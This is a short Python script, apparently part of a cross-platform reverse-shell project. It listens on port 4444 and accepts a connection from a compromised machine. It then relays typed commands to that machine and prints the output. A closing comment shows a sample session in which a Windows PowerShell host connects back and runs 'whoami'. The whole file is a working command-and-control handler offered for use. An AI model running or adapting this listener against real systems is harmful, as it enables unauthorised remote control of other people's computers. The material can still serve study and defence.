#!/usr/bin/python3
import socket
import sys
import threading
import time

def receive_output(client_socket):
	"""Separate thread to continously receive and display output"""
	while True:
		try:
			data=client_socket.recv(4096)
			if not data:
				break
			print(data.decode('utf-8', errors='ignore'), end='')
			sys.stdout.flush()
		except Exception:
			break

def simple_listener(port=4444):
	try:
		#create socket
		sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

		#Bind and Listen
		sock.bind(('0.0.0.0', port))
		sock.listen(5)

		print(f"[+]Listening on port: {port}")

		#Accept connections
		client_socket, client_address=sock.accept()
		print(f"[+]Connection from: {client_address}")

		#Start receiver thread
		receiver_thread=threading.Thread(target=receive_output, args=(client_socket,))

		receiver_thread.daemon=True
		receiver_thread.start()

		print("[+]Interactive shell ready. Type commands below")

		#Interructive shell-only handle sending commands
		try:
			while True:
				command=input()

				if command.lower()	=='exit':
					client_socket.send(b'exit\n')
					break

				#send command to target
				client_socket.send((command + '\n').encode())
				time.sleep(0.1)   #small delay to let the command process

		except KeyboardInterrupt:
			print("\n[!] Closing Connection")
		except EOFError:
			print("\n[!] Session ended")
		finally:
			client_socket.close()
			sock.close()

	except Exception as e:
		print(f"[-]Error: {e}")


if __name__ =="__main__":
	port=int(sys.argv[1]) if len(sys.argv) > 1 else 4444
	simple_listener(port)


"""
└─$ python main.py
[+]Listening on port: 4444
[+]Connection from: ('192.168.1.106', 52575)
[+]Interactive shell ready. Type commands below
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS J:Cross_Plat_R_Shell> whoami
whoami
desktop-lsf7uhq\\user
PS J:Cross_Plat_R_Shell> 

"""
